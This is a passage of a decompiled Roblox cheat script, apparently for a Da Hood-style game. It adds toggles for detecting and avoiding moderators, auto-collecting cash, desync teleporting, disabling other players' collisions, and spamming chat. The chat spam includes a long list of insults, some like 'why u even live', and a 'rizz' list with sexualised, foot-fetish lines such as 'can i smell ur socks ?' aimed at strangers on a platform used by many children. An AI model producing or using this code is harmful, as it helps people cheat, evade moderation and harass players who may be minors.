	local v580, v581, v582 = ipairs(v_u_568)
	while true do
		local v583
		v582, v583 = v580(v581, v582)
		if v582 == nil then
			break
		end
		if string.find(p579, v583, 1, true) then
			return true
		end
	end
	return false
end
local function v_u_593(p_u_585)
	-- upvalues: (ref) v_u_569
	local v586, v587, v588 = ipairs(v_u_569)
	while true do
		local v_u_589
		v588, v_u_589 = v586(v587, v588)
		if v588 == nil then
			break
		end
		local v590, v591 = pcall(p_u_585.GetRankInGroup, p_u_585, v_u_589)
		if v590 and (v591 and 0 < v591) then
			local v_u_592 = "Unknown"
			pcall(function()
				-- upvalues: (ref) v_u_592, (ref) p_u_585, (ref) v_u_589
				v_u_592 = p_u_585:GetRoleInGroup(v_u_589)
			end)
			return true, v_u_592
		end
	end
	return false, nil
end
local function v_u_595(p594)
	-- upvalues: (ref) v_u_567
	return v_u_567[p594.UserId] or false
end
local function v_u_608()
	-- upvalues: (ref) v_u_566, (ref) v_u_565, (ref) v_u_570, (ref) v_u_584, (ref) v_u_595, (ref) v_u_593, (ref) v_u_573, (ref) v_u_578, (ref) v_u_2, (ref) v_u_574
	local v596 = v_u_566
	local v597, v598, v599 = ipairs(v596:GetPlayers())
	while true do
		local v_u_600
		v599, v_u_600 = v597(v598, v599)
		if v599 == nil then
			break
		end
		if v_u_600 ~= v_u_565 then
			local v601 = v_u_600.Name:lower()
			local v602 = v_u_600.DisplayName:lower()
			local v603 = v_u_570[v601] or (v_u_570[v602] or v_u_584(v_u_600.Name) or (v_u_584(v_u_600.DisplayName) or v_u_595(v_u_600)))
			local v604, v605 = v_u_593(v_u_600)
			if v604 and true or v603 then
				local v_u_606 = v604 and " (Rank: " .. tostring(v605) .. ")" or ""
				if v_u_573 == "kick" then
					v_u_565:Kick("Moderator/Admin detected @" .. v_u_600.Name .. v_u_606)
					return
				end
				if not v_u_578[v_u_600.UserId] then
					v_u_578[v_u_600.UserId] = true
					pcall(function()
						-- upvalues: (ref) v_u_2, (ref) v_u_600, (ref) v_u_606, (ref) v_u_574
						v_u_2:Notify("Moderator/Admin detected: " .. v_u_600.Name .. v_u_606, 5)
						local v607 = Instance.new("Sound")
						v607.SoundId = "rbxassetid://" .. v_u_574
						v607.Volume = 10
						v607.Parent = workspace
						v607:Play()
						game.Debris:AddItem(v607, 6)
					end)
				end
			end
		end
	end
end
v491:AddToggle("ModDetector", {
	["Text"] = "Mod Detector",
	["Default"] = false,
	["Callback"] = function(p609)
		-- upvalues: (ref) v_u_572, (ref) v_u_608, (ref) v_u_575, (ref) v_u_566, (ref) v_u_576, (ref) v_u_5, (ref) v_u_577, (ref) v_u_578
		v_u_572 = p609
		if p609 then
			v_u_608()
			v_u_575 = v_u_566.PlayerAdded:Connect(v_u_608)
			v_u_576 = v_u_5.Heartbeat:Connect(function()
				-- upvalues: (ref) v_u_577, (ref) v_u_608
				if tick() - v_u_577 >= 3 then
					v_u_608()
					v_u_577 = tick()
				end
			end)
		else
			if v_u_575 then
				v_u_575:Disconnect()
			end
			if v_u_576 then
				v_u_576:Disconnect()
			end
			v_u_575 = nil
			v_u_576 = nil
			v_u_578 = {}
		end
	end
})
v491:AddDropdown("ModActionDropdown", {
	["Values"] = { "kick", "notify" },
	["Default"] = "kick",
	["Text"] = "detect mode",
	["Callback"] = function(p610)
		-- upvalues: (ref) v_u_573
		v_u_573 = p610
	end
})
CASH_AURA_ENABLED = false
COOLDOWN = 0.2
CASH_AURA_RANGE = 17
function GetCash()
	local v611 = {}
	local v612 = workspace:FindFirstChild("Ignored")
	if v612 then
		v612 = workspace.Ignored:FindFirstChild("Drop")
	end
	if v612 then
		local v613, v614, v615 = pairs(v612:GetChildren())
		while true do
			local v616
			v615, v616 = v613(v614, v615)
			if v615 == nil then
				break
			end
			if v616.Name == "MoneyDrop" then
				local v617 = v616:GetAttribute("OriginalPos") or v616.Position
				if game.Players.LocalPlayer.Character and (game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and (v617 - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= CASH_AURA_RANGE) then
					table.insert(v611, v616)
				end
			end
		end
	end
	return v611
end
function CashAura()
	while CASH_AURA_ENABLED do
		local v618 = GetCash()
		local v619, v620, v621 = pairs(v618)
		while true do
			local v622
			v621, v622 = v619(v620, v621)
			if v621 == nil then
				break
			end
			local v623 = v622:FindFirstChildOfClass("ClickDetector")
			if v623 then
				fireclickdetector(v623)
			end
		end
		task.wait(COOLDOWN)
	end
end
v491:AddToggle("Cash_Aura_Toggle", {
	["Text"] = "Cash Aura",
	["Default"] = false,
	["Callback"] = function(p624)
		CASH_AURA_ENABLED = p624
		if CASH_AURA_ENABLED then
			task.spawn(CashAura)
		end
	end
})
local v_u_625 = {
	"SunRaysEffect",
	"ColorCorrectionEffect",
	"BloomEffect",
	"DepthOfFieldEffect"
}
local v_u_626 = {
	"ParticleEmitter",
	"Trail",
	"Fire",
	"Smoke"
}
local v_u_627 = nil
local v_u_628 = {}
local function v_u_630(p_u_629)
	-- upvalues: (ref) v_u_625
	if table.find(v_u_625, p_u_629.ClassName) then
		pcall(function()
			-- upvalues: (ref) p_u_629
			p_u_629:Destroy()
		end)
	end
end
local function v_u_632(p_u_631)
	-- upvalues: (ref) v_u_626
	if table.find(v_u_626, p_u_631.ClassName) then
		pcall(function()
			-- upvalues: (ref) p_u_631
			p_u_631:Destroy()
		end)
	end
end
local function v_u_646()
	-- upvalues: (ref) v_u_492, (ref) v_u_630, (ref) v_u_632
	local v633 = v_u_492
	local v634, v635, v636 = ipairs(v633:GetDescendants())
	while true do
		local v637
		v636, v637 = v634(v635, v636)
		if v636 == nil then
			break
		end
		v_u_630(v637)
	end
	local v638, v639, v640 = ipairs(workspace:GetDescendants())
	while true do
		local v641
		v640, v641 = v638(v639, v640)
		if v640 == nil then
			break
		end
		v_u_632(v641)
	end
	local v642, v643, v644 = ipairs(game:GetService("StarterGui"):GetDescendants())
	while true do
		local v645
		v644, v645 = v642(v643, v644)
		if v644 == nil then
			break
		end
		v_u_632(v645)
	end
end
local function v_u_652()
	-- upvalues: (ref) v_u_627, (ref) v_u_492, (ref) v_u_630, (ref) v_u_632, (ref) v_u_628
	if v_u_627 then
		v_u_627:Disconnect()
	end
	v_u_627 = v_u_492.DescendantAdded:Connect(function(p647)
		-- upvalues: (ref) v_u_630
		task.wait(0.1)
		v_u_630(p647)
	end)
	local v649 = workspace.DescendantAdded:Connect(function(p648)
		-- upvalues: (ref) v_u_632
		task.wait(0.1)
		v_u_632(p648)
	end)
	table.insert(v_u_628, v649)
	local v651 = starterGui.DescendantAdded:Connect(function(p650)
		-- upvalues: (ref) v_u_632
		task.wait(0.1)
		v_u_632(p650)
	end)
	table.insert(v_u_628, v651)
end
local function v_u_657()
	-- upvalues: (ref) v_u_628
	local v653, v654, v655 = ipairs(v_u_628)
	while true do
		local v656
		v655, v656 = v653(v654, v655)
		if v655 == nil then
			break
		end
		v656:Disconnect()
	end
	v_u_628 = {}
end
v491:AddToggle("AntiEffects", {
	["Text"] = "Anti Effects",
	["Callback"] = function(p658)
		-- upvalues: (ref) v_u_646, (ref) v_u_652, (ref) v_u_627, (ref) v_u_657
		if p658 then
			v_u_646()
			v_u_652()
		else
			if v_u_627 then
				v_u_627:Disconnect()
				v_u_627 = nil
			end
			v_u_657()
		end
	end,
	["Enabled"] = false
})
local v659 = getgenv()
local v660 = getgenv()
getgenv().AntiRPGDesyncLoop = nil
v660.GrenadeDetectionEnabled = false
v659.AntiRPGDesyncEnabled = false
local v_u_661 = game:GetService("RunService")
local v_u_662 = game.Workspace
local v_u_663 = game.Players.LocalPlayer
local function v_u_667(p664)
	-- upvalues: (ref) v_u_662, (ref) v_u_663
	local v665 = v_u_662:FindFirstChild("Ignored")
	if v665 then
		v665 = v_u_662.Ignored:FindFirstChild(p664)
	end
	local v666 = v_u_663.Character
	if v666 then
		v666 = v_u_663.Character:FindFirstChild("HumanoidRootPart")
	end
	if v665 then
		if v666 then
			v666 = (v665.Position - v666.Position).Magnitude < 16
		end
	else
		v666 = v665
	end
	return v666
end
local function v_u_674()
	-- upvalues: (ref) v_u_661, (ref) v_u_663, (ref) v_u_662, (ref) v_u_667, (ref) v_u_674
	if not getgenv().AntiRPGDesyncLoop then
		getgenv().AntiRPGDesyncLoop = v_u_661.PostSimulation:Connect(function()
			-- upvalues: (ref) v_u_663, (ref) v_u_662, (ref) v_u_667, (ref) v_u_661
			local v668 = v_u_663.Character
			if v668 then
				v668 = v_u_663.Character:FindFirstChild("HumanoidRootPart")
			end
			local v669 = v_u_663.Character
			if v669 then
				v669 = v_u_663.Character:FindFirstChild("Humanoid")
			end
			if v668 and v669 then
				local v670 = v_u_662.Ignored:FindFirstChild("Model")
				if v670 then
					v670 = v_u_662.Ignored.Model:FindFirstChild("Launcher")
				end
				local v671 = v_u_667("Handle")
				if getgenv().AntiRPGDesyncEnabled and v670 or getgenv().GrenadeDetectionEnabled and v671 then
					local v672 = Vector3.new(math.random(-100, 100), math.random(50, 150), math.random(-100, 100))
					v669.CameraOffset = -v672
					local v673 = v668.CFrame
					v668.CFrame = CFrame.new(v668.CFrame.Position + v672)
					v_u_661.RenderStepped:Wait()
					v668.CFrame = v673
				end
			end
		end)
		v_u_663.CharacterAdded:Connect(function()
			-- upvalues: (ref) v_u_674
			task.wait(1)
			if getgenv().AntiRPGDesyncEnabled or getgenv().GrenadeDetectionEnabled then
				v_u_674()
			end
		end)
	end
end
local function v_u_675()
	if getgenv().AntiRPGDesyncLoop then
		getgenv().AntiRPGDesyncLoop:Disconnect()
		getgenv().AntiRPGDesyncLoop = nil
	end
end
v491:AddToggle("RPGDetection", {
	["Text"] = "Anti RPG",
	["Default"] = false,
	["Callback"] = function(p676)
		-- upvalues: (ref) v_u_674, (ref) v_u_675
		getgenv().AntiRPGDesyncEnabled = p676
		if p676 or getgenv().GrenadeDetectionEnabled then
			v_u_674()
		else
			v_u_675()
		end
	end
})
v491:AddToggle("GrenadeDetection", {
	["Text"] = "Anti Grenade",
	["Default"] = false,
	["Callback"] = function(p677)
		-- upvalues: (ref) v_u_674, (ref) v_u_675
		getgenv().GrenadeDetectionEnabled = p677
		if p677 or getgenv().AntiRPGDesyncEnabled then
			v_u_674()
		else
			v_u_675()
		end
	end
})
local v_u_678 = nil
v491:AddToggle("AntiflingToggle", {
	["Text"] = "Anti Fling",
	["Default"] = false,
	["Callback"] = function(p679)
		-- upvalues: (ref) v_u_678, (ref) v_u_663
		local v_u_680 = game:GetService("Players")
		local v681 = game:GetService("RunService")
		if p679 then
			v_u_678 = v681.Heartbeat:Connect(function()
				-- upvalues: (ref) v_u_680, (ref) v_u_663
				local v682 = v_u_680
				local v683, v684, v685 = ipairs(v682:GetPlayers())
				while true do
					local v686
					v685, v686 = v683(v684, v685)
					if v685 == nil then
						break
					end
					if v686 ~= v_u_663 and v686.Character then
						local v687 = v686.Character:FindFirstChild("HumanoidRootPart")
						if v687 then
							v687.Velocity = Vector3.zero
							v687.RotVelocity = Vector3.zero
							v687.AssemblyAngularVelocity = Vector3.zero
							v687.AssemblyLinearVelocity = Vector3.zero
						end
						local v688, v689, v690 = ipairs(v686.Character:GetDescendants())
						while true do
							local v691
							v690, v691 = v688(v689, v690)
							if v690 == nil then
								break
							end
							if v691:IsA("BasePart") then
								v691.CanCollide = false
							end
						end
					end
				end
			end)
			local v692, v693, v694 = ipairs(v_u_680:GetPlayers())
			while true do
				local v695
				v694, v695 = v692(v693, v694)
				if v694 == nil then
					break
				end
				if v695 ~= v_u_663 and v695.Character then
					local v696, v697, v698 = ipairs(v695.Character:GetDescendants())
					while true do
						local v699
						v698, v699 = v696(v697, v698)
						if v698 == nil then
							break
						end
						if v699:IsA("BasePart") then
							v699.CanCollide = false
						end
					end
				end
			end
			v_u_680.PlayerAdded:Connect(function(p700)
				p700.CharacterAdded:Connect(function(p701)
					task.wait(0.5)
					local v702, v703, v704 = ipairs(p701:GetDescendants())
					while true do
						local v705
						v704, v705 = v702(v703, v704)
						if v704 == nil then
							break
						end
						if v705:IsA("BasePart") then
							v705.CanCollide = false
						end
					end
				end)
			end)
		elseif v_u_678 then
			v_u_678:Disconnect()
			v_u_678 = nil
		end
	end
})
local v_u_706 = workspace.FallenPartsDestroyHeight
v491:AddToggle("AntiVoid", {
	["Text"] = "Anti Void",
	["Default"] = false,
	["Callback"] = function(p707)
		-- upvalues: (ref) v_u_706
		if p707 then
			v_u_706 = workspace.FallenPartsDestroyHeight
			workspace.FallenPartsDestroyHeight = -math.huge
		else
			workspace.FallenPartsDestroyHeight = v_u_706
		end
	end
})
local v_u_708 = game:GetService("TextChatService")
local v_u_709 = {}
local v710 = "ChatWindowEnabled"
local v711 = v_u_708:FindFirstChild("ChatWindowConfiguration")
if v711 then
	v711 = v_u_708.ChatWindowConfiguration.Enabled
end
v_u_709[v710] = v711
local v712 = "ChatInputEnabled"
local v713 = v_u_708:FindFirstChild("ChatInputBarConfiguration")
if v713 then
	v713 = v_u_708.ChatInputBarConfiguration.Enabled
end
v_u_709[v712] = v713
v_u_709.CoreGuiChat = v_u_562:GetCoreGuiEnabled(Enum.CoreGuiType.Chat)
v491:AddToggle("ChatSpyToggle", {
	["Text"] = "Chat Spy",
	["Default"] = false,
	["Callback"] = function(p714)
		-- upvalues: (ref) v_u_708, (ref) v_u_562, (ref) v_u_709
		if p714 then
			if v_u_708:FindFirstChild("ChatWindowConfiguration") then
				v_u_708.ChatWindowConfiguration.Enabled = true
			end
			if v_u_708:FindFirstChild("ChatInputBarConfiguration") then
				v_u_708.ChatInputBarConfiguration.Enabled = true
			end
			v_u_562:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
		else
			if v_u_708:FindFirstChild("ChatWindowConfiguration") then
				v_u_708.ChatWindowConfiguration.Enabled = v_u_709.ChatWindowEnabled
			end
			if v_u_708:FindFirstChild("ChatInputBarConfiguration") then
				v_u_708.ChatInputBarConfiguration.Enabled = v_u_709.ChatInputEnabled
			end
			v_u_562:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, v_u_709.CoreGuiChat)
		end
	end
})
local v_u_715 = {}
local function v_u_725(p716)
	-- upvalues: (ref) v_u_715
	if #v_u_715 == 0 then
		local v717, v718, v719 = pairs(workspace:GetDescendants())
		while true do
			local v720
			v719, v720 = v717(v718, v719)
			if v719 == nil then
				break
			end
			if v720:IsA("Seat") or v720:IsA("VehicleSeat") then
				table.insert(v_u_715, v720)
			end
		end
	end
	local v721, v722, v723 = pairs(v_u_715)
	while true do
		local v724
		v723, v724 = v721(v722, v723)
		if v723 == nil then
			break
		end
		v724.Disabled = p716
	end
end
v491:AddToggle("Disable Seats", {
	["Text"] = "Disable Seats",
	["Callback"] = function(p726)
		-- upvalues: (ref) v_u_725
		v_u_725(p726)
	end,
	["Enabled"] = false
})
local v727 = game:GetService("TextChatService")
channel = v727.TextChannels.RBXGeneral
messages = {
	"bro tried to kill me ? what an loser",
	"Skid!!! skid!!!11111 you are skid",
	"probably skill issue moment",
	"WHERE BRO AIMING AT!?",
	"ong ur so bad",
	"imagine dying to me",
	"whats the point of playing with that aim",
	"talking with dots is special language for you ?",
	"wowzies",
	"1d luh bro",
	"WOW U SUCK",
	"couldnt be me",
	"just broke ur ankles",
	"UR ANKLES? GONE?",
	"destroyed",
	"LOL DESTROYED",
	"LOL",
	"ur aim trash",
	"cant touch this",
	"just admit ur aim sucks",
	"ez clapped",
	"get rekt",
	"try harder next time",
	"noob alert",
	"lag much?",
	"u suck at this game dude!",
	"1v1 me lol",
	"why even try?",
	"dude just admit u suck",
	"what is that guy trying to do ?",
	"im using the best executor than jjsploit!",
	"absolute bot moment",
	"ez brainless kill",
	"did you even practice?",
	"aim assist much?",
	"cant believe this hit",
	"why u even live",
	"easy clap kid",
	"get carried harder",
	"get outplayed",
	"u literally walking target",
	"think before you shoot",
	"ez money",
	"try aiming next time",
	"ur controller must be broken",
	"ez noob farm",
	"too slow bro",
	"you wish u were this good",
	"bot detected",
	"cant even hit stationary",
	"learning curve much?",
	"ez tutorial boss",
	"come back when u git gud",
	"u just got demoed",
	"no skill, all luck",
	"trash tier play",
	"im the nightmare of your dreams",
	"try harder or rage quit",
	"u literally feed me",
	"EZ clap, again",
	"ur brain must be lagging",
	"thinking like a bot",
	"cant clutch this",
	"ez teleport kill",
	"im untouchable",
	"try again, maybe next life",
	"what a free kill",
	"maybe uninstall",
	"ur so predictable",
	"ez pew pew",
	"cant escape the skill",
	"ur RNG is trash",
	"pathetic attempt",
	"u wish u were me",
	"ez demolition",
	"no reaction time bro",
	"u just got embarrassed",
	"my grandma could aim better",
	"ez brainless farm",
	"u feed, i lead",
	"ur ego is carry me",
	"ez ez ez",
	"cant believe this is allowed",
	"u cant even hit me",
	"u wish u had my aim",
	"ur my biggest fan huh?",
	"cant stop watching me",
	"obsessed much?",
	"dreaming about me?",
	"stalking me in game?",
	"all this just for me?",
	"ur attention is mine now",
	"im famous and u know it",
	"cant hide your fanboy vibes",
	"ur obsession is obvious",
	"ur aim is as bad as ur jokes",
	"literally bot behavior",
	"cant even press W correctly",
	"ez aim practice",
	"try using both hands",
	"i feel bad for u",
	"maybe uninstall Roblox",
	"ur keyboard must be broken",
	"lagging in real life?",
	"cant even hit a dummy",
	"u need aim lessons",
	"gg ez",
	"ur brain on cooldown",
	"try moving instead of standing",
	"ez skill gap",
	"1v1 me in slow motion",
	"my cat could kill u",
	"u feed harder than anyone",
	"ur so free",
	"u should play offline",
	"ur mouse has no DPI",
	"im doing this with one hand",
	"ur reaction time is potato",
	"cant hit a stationary part",
	"ez brain dead",
	"try breathing and aiming",
	"u literally die from air",
	"ur aim is paper thin",
	"i dont even try",
	"u keep feeding me",
	"pathetic",
	"ur RNG is cursed",
	"ez noob destruction",
	"cant touch this ez",
	"im carrying ur whole team",
	"u need a tutorial",
	"ur shots are imaginary",
	"why even try",
	"get some practice bro",
	"ur aim is a meme",
	"stop moving pls",
	"cant dodge my bullets",
	"ur game sense is broken",
	"ez ez ez again",
	"ur aim is a disaster",
	"try a different game",
	"u literally gift me kills",
	"EZ gg easy clap",
	"cant even hit air",
	"ur keyboard layout is wrong",
	"total bot",
	"ur aim is tragic",
	"bot feeder detected",
	"im unstoppable",
	"u cant hit this",
	"ez brainless",
	"u literally chasing me",
	"cant even react",
	"u wish u had my skill",
	"easy clap incoming",
	"ur game sense is trash",
	"try again noob",
	"im too fast for u",
	"ur shots are weak",
	"u cant aim straight",
	"stop feeding me",
	"ur team is useless",
	"EZ wipe",
	"ur reaction time zero",
	"cant even hit moving",
	"lol ur predictable",
	"ur aim is hopeless",
	"cant beat me",
	"EZ brainless carry",
	"ur skills are imaginary",
	"ur mouse lagging?",
	"EZ ez ez ez",
	"ur aim is weak",
	"cant even land headshots",
	"u literally feed daily",
	"EZ demolition complete",
	"ur skill rating is 0",
	"try harder noob",
	"EZ wipe again",
	"ur brain cant keep up",
	"cant escape my skill",
	"EZ domination",
	"ur aim is tragic again",
	"EZ victory lap",
	"cant touch me",
	"ur fanboy mode activated",
	"stalking much?",
	"EZ feed farm",
	"ur aim is garbage",
	"EZ EZ EZ final",
	"ur obsession shows",
	"ur aim is pure chaos",
	"cant dodge ez bullets",
	"EZ feed complete",
	"ur fan vibes strong",
	"EZ gg wp",
	"ur reactions nonexistent",
	"EZ brainless massacre",
	"cant follow my speed",
	"ur aim is nonexistent",
	"bro cant even hit air",
	"npc movement detected",
	"u missed a standing target",
	"walking free kill",
	"aim slower than my wifi",
	"still learning wasd?",
	"missed again wow",
	"ur aim expired",
	"walking xp bag",
	"default bot behavior",
	"cant even 1v0",
	"u shooting ghosts",
	"walking L detected",
	"spectators laughing rn",
	"ur kd = 0",
	"bro lost to map",
	"respawn faster kid",
	"ur mouse broken or what",
	"walking donation",
	"aim softer than bread",
	"bro missed afk",
	"u aim like blind cat",
	"ur kills imaginary",
	"press uninstall already",
	"npc with scripts > u",
	"still in training stage",
	"ur ping = ur iq",
	"ur skill bugged",
	"walking reset button",
	"ur accuracy negative",
	"bro cant press shoot",
	"spawn = death for u",
	"ur aim random number",
	"still loading skill pack",
	"ur reaction expired",
	"walking lag spike",
	"bro plays in slow mode",
	"ur aim like broken ui",
	"cant aim straight",
	"u play like obby lava",
	"bro missed point blank",
	"ur kd cry ratio",
	"npc smoother than u",
	"ur aim placebo",
	"bro runs like cutscene",
	"cant clutch 1v0",
	"walking trashcan",
	"bro still beta tester",
	"ur brain timeout",
	"u aim on tutorial bot",
	"still lagging 2025",
	"ur hands slippery",
	"bro feeding nonstop",
	"ur aim pure chaos",
	"press alt f4 for skill",
	"walking zero damage",
	"ur reaction potato",
	"bro spectating himself",
	"cant dodge ez shots",
	"ur aim placebo effect",
	"respawn is ur best skill",
	"bro shooting walls",
	"ur shots imaginary",
	"walking disaster",
	"aim reset required",
	"bro died to gravity",
	"ur aim tutorial level",
	"still on default settings",
	"ur aim invisible",
	"walking free xp",
	"bro misclicked life",
	"ur brain bugged",
	"aim patch not installed",
	"cant win coinflip",
	"u gift kills daily",
	"walking comedy",
	"bro plays like statue",
	"ur kd refund worthy",
	"still no improvement",
	"ur aim disabled",
	"bro needs dlc to aim",
	"ur game sense 0",
	"npc pathfinding better",
	"ur brain afk",
	"walking demo target",
	"cant escape skill issue",
	"ur kd cry fest",
	"still missing bro?",
	"ur aim fossil",
	"bro typing instead of aiming",
	"ur playstyle tutorial",
	"walking practice dummy",
	"u miss more than u breathe",
	"ur rng cursed",
	"spawn = free kill",
	"bro losing to bots",
	"ur aim lagging",
	"walking hitbox for me",
	"cant hit static",
	"ur kd nightmare",
	"still not improved",
	"bro forgot shoot key",
	"ur aim glitching",
	"walking zero skill",
	"ur mouse wireless on 1%",
	"bro drifts like lag",
	"cant react on time",
	"ur shots weak af",
	"still stuck bronze",
	"ur aim downgrade",
	"bro playing with delay",
	"ur stats negative",
	"walking bot clone",
	"cant move right",
	"ur aim is nothing same your life too",
	"hahahah just admit u suck LOL",
	"need help ? call your mom",
	"ur bullets got lost on the way",
	"bro aiming like a blindfolded cat",
	"walking donation XP incoming",
	"ur mouse is on vacation",
	"bro forgot gravity exists",
	"cant dodge my cursor",
	"ur aim just filed for retirement",
	"bro shooting imaginary targets",
	"walking bot factory",
	"ur brain lagging IRL?",
	"bro needs aim patch",
	"cant even hit stationary again",
	"ur reactions expired",
	"bro playing with invisible hands",
	"walking L deluxe edition",
	"ur stats are hallucinations",
	"bro forgot the click button exists",
	"cant aim through walls? sad",
	"ur RNG got kidnapped",
	"bro respawning like a champ",
	"walking tutorial dummy",
	"ur aim got ghosted",
	"bro missed point blank again",
	"ur mouse allergic to clicks",
	"cant dodge my shadow",
	"bro walking lag spike",
	"ur brain on airplane mode",
	"cant even hit thin air",
	"bro shooting walls like pro",
	"walking zero damage",
	"ur hits are invisible",
	"bro practicing in slow motion",
	"ur accuracy negative confirmed",
	"cant survive gravity 101",
	"bro still pressing space wrong",
	"ur bullets need GPS",
	"walking disaster certified",
	"bro died to floor damage",
	"ur aim in airplane mode",
	"cant react to skill",
	"bro shooting ghosts again",
	"ur stats in witness protection",
	"walking free kill deluxe",
	"bro respawning like legend",
	"ur mouse on strike",
	"cant even hit a wall?",
	"bro practicing in reverse",
	"ur aim filed for unemployment",
	"walking comedy level 100",
	"bro dying to everything",
	"ur RNG went bankrupt",
	"cant dodge my imagination",
	"bro feeding like a pro",
	"ur reactions are optional",
	"walking L simulator",
	"bro still beta testing life",
	"ur aim got lost in translation",
	"cant follow my speed",
	"bro shooting shadows again",
	"ur mouse is shy",
	"walking XP donation",
	"bro lagged out of skill",
	"ur accuracy just retired",
	"cant hit the tutorial target",
	"bro needs skill DLC",
	"ur aim in negative mode",
	"walking disaster demo",
	"bro typing instead of shooting",
	"ur shots are optional DLC",
	"cant survive this skill gap",
	"bro still stuck bronze",
	"ur aim downgraded again",
	"walking zero skill factory",
	"bro missed life again",
	"ur brain on cooldown forever",
	"cant dodge my bullets",
	"bro shooting air like pro",
	"ur hits need GPS tracker",
	"walking free XP",
	"bro respawning like NPC",
	"ur aim invisible confirmed",
	"cant hit moving target?",
	"bro lagging in real life",
	"ur RNG is cursed",
	"walking disaster deluxe edition",
	"bro still in tutorial",
	"ur aim needs patch",
	"cant even press shoot",
	"bro playing slow mode activated",
	"ur mouse wireless at 1%",
	"walking demo target detected",
	"bro forgot to aim",
	"ur bullets went sightseeing",
	"cant react in time bro",
	"bro feeding nonstop",
	"ur skill rating = 0",
	"walking hitbox for me",
	"bro missed again wow",
	"ur aim expired yesterday",
	"cant dodge ez shots",
	"bro respawning like pro",
	"ur brain bugged confirmed",
	"walking L factory",
	"bro typing instead of moving",
	"ur hits are myths",
	"cant even hit air twice",
	"bro lost to map geometry",
	"ur aim tutorial level",
	"walking free kill machine",
	"bro misclicked life",
	"ur RNG cursed again",
	"cant beat me in slow motion",
	"bro feeding daily",
	"ur aim placebo effect",
	"walking disaster confirmed",
	"bro needs tutorial mod",
	"ur mouse lost in translation",
	"cant react on time",
	"bro playing with delay",
	"ur shots weak af",
	"walking bot clone",
	"you also smells terrible"
}
isEnabled = false
shuffledMessages = {}
currentIndex = 1
function shuffle(p728)
	for v729 = #p728, 2, -1 do
		local v730 = math.random(v729)
		local v731 = p728[v730]
		p728[v730] = p728[v729]
		p728[v729] = v731
	end
end
function resetShuffled()
	shuffledMessages = {}
	for v732 = 1, #messages do
		table.insert(shuffledMessages, messages[v732])
	end
	shuffle(shuffledMessages)
	currentIndex = 1
end
function sendMessagesSequentially()
	if #shuffledMessages == 0 then
		resetShuffled()
	end
	while isEnabled do
		if channel then
			channel:SendAsync(shuffledMessages[currentIndex])
		end
		currentIndex = currentIndex + 1
		if currentIndex > #shuffledMessages then
			resetShuffled()
		end
		wait(3)
	end
end
v491:AddToggle("TestTalk", {
	["Text"] = "Trash Talk",
	["Default"] = false
}):OnChanged(function(p733)
	isEnabled = p733
	if p733 then
		spawn(sendMessagesSequentially)
	end
end)
rizzMessages = {
	"hey, you caught my eye",
	"you seem really interesting",
	"i like how you move and how you smells",
	"you have a great face",
	"i can\226\128\153t stop noticing you",
	"wanna chat sometime?",
	"you\226\128\153re really captivating",
	"i could watch you play all day",
	"you should take off your shoes and socks you know for what",
	"you make everything look easy",
	"i admire how focused you are",
	"you\226\128\153re really talented",
	"i like your waterproof energy",
	"you brighten my day just by being here",
	"you have an amazing style",
	"i like your confidence",
	"can i smell u ? you smells so good",
	"there\226\128\153s something about you",
	"i like the way you think",
	"you make the game more fun for dihs",
	"your presence is refreshing",
	"i like how unique you are",
	"you\226\128\153re someone i want to know better",
	"i admire your determination",
	"you\226\128\153re unforgettable",
	"i like your mindset",
	"are you wifi? cuz i\226\128\153m feeling a connection",
	"you\226\128\153re very intriguing",
	"you stand out in every way",
	"i can\226\128\153t help but smile when i see you",
	"your vibe is unmatched",
	"you make winning look easy",
	"i like your focus",
	"you\226\128\153re always confident",
	"i enjoy watching you play",
	"your moves are smooth",
	"i like how composed you are",
	"you\226\128\153re fun to be around",
	"your energy is contagious",
	"i like your style and grace",
	"you have a natural charm",
	"i feel drawn to you",
	"you\226\128\153re captivating effortlessly",
	"i like how playful you are",
	"you seem very smart",
	"i admire your strategy",
	"you\226\128\153re fascinating",
	"i like your confidence and poise",
	"you\226\128\153re always in control",
	"can i smell ur shoes ?",
	"i enjoy your company",
	"you have a spark i can\226\128\153t ignore",
	"i like your personality",
	"you make the game more exciting",
	"i admire your skill",
	"you\226\128\153re so engaging",
	"i like your passion",
	"you have amazing instincts",
	"you\226\128\153re very inspiring",
	"i enjoy watching your decisions",
	"you\226\128\153re fun to follow",
	"i like your creativity",
	"you\226\128\153re very thoughtful",
	"i like how unique your style is",
	"you make challenges fun",
	"you\226\128\153re impressive",
	"i like your calmness under pressure",
	"you\226\128\153re very skilled",
	"i enjoy how you lead",
	"you\226\128\153re very confident",
	"can i smell ur socks ?",
	"i like your reactions",
	"you\226\128\153re playful in a great way",
	"i like your dedication",
	"you\226\128\153re very entertaining",
	"i like your cleverness",
	"you\226\128\153re very charming",
	"i admire your patience",
	"you\226\128\153re always interesting",
	"i like your sharpness",
	"you\226\128\153re inspiring to watch",
	"i like your boldness",
	"you\226\128\153re naturally fun",
	"i admire your consistency",
	"you\226\128\153re very dynamic",
	"i like how you adapt",
	"you\226\128\153re very energetic",
	"i enjoy your humor",
	"you\226\128\153re very engaging",
	"i like your initiative",
	"you\226\128\153re a natural at this",
	"i like your enthusiasm",
	"you\226\128\153re very impressive",
	"i enjoy your vibe",
	"you\226\128\153re very motivating",
	"i like your calm energy",
	"you\226\128\153re very expressive",
	"i enjoy your presence",
	"you\226\128\153re fun to interact with",
	"i like your alertness",
	"you\226\128\153re captivating to watch",
	"i admire your confidence and poise",
	"you\226\128\153re naturally cool",
	"i like your creativity and style",
	"you\226\128\153re very charming",
	"i enjoy your energy and humor",
	"you\226\128\153re fascinating to follow",
	"i like your natural charisma",
	"you\226\128\153re very inspiring",
	"i enjoy your attention to detail",
	"you\226\128\153re naturally magnetic",
	"i like how smooth you are",
	"you\226\128\153re very memorable",
	"i enjoy your sharp instincts",
	"you\226\128\153re naturally attractive",
	"i like how you wear stockings",
	"i like your elegance and grace",
	"you\226\128\153re very impressive overall",
	"i admire your playfulness",
	"you\226\128\153re naturally entertaining",
	"i enjoy your unique energy",
	"you\226\128\153re very captivating overall",
	"i like your natural charm",
	"are you a magician? cuz whenever you\226\128\153re around, everyone else disappears",
	"you must be a map, because I keep getting lost in your eyes",
	"are you a campfire? cuz you\226\128\153re hot and I want s\226\128\153more",
	"if being cute was a crime, you\226\128\153d be serving a life sentence",
	"you\226\128\153ve got something I can\226\128\153t quite put into words\226\128\166 probably charm overload",
